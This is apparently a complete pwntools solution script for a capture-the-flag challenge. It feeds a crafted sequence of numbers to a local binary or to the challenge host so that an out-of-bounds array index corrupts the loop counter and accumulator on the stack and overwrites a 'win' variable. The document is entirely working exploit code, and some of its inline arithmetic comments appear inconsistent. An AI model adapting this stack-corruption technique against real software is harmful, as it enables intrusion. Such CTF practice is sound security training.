from pwn import *
import sys
context.log_level='error'

# Stack layout (no canary, no PIE), numbers[k] @ rbp-0x2c + 4k:
#   k=-1 -> win (rbp-0x30)   k=0..6 -> numbers   k=9 -> accum   k=10 -> i
seq = [
    0,0,0,0,0,0,   # idx 0..5, accum = 0
    67,            # idx 6 -> accum == 67 -> bonus i++ -> i jumps 6 -> 8 (OOB)
    1,             # idx 8  (padding) accum = 68
    0,             # idx 9  == accum  -> accum = 0+0 = 0
    -2,            # idx 10 == i      -> i = -2, accum = -2, then i++ -> -1
    1337,          # idx -1 == win    -> win = 1337 != 0x67 ; i++ -> 0
    0,0,0,0,0,0,0, # idx 0..6 again, accum stays 1335, loop exits at i == 7
]

tgt = remote('chal.secso.cc', 4001) if 'remote' in sys.argv else process('./chal')
for v in seq:
    tgt.sendlineafter(b'number> ', str(v).encode())
tgt.recvuntil(b'spinning', timeout=10)
print(tgt.recvall(timeout=8).decode(errors='replace'))
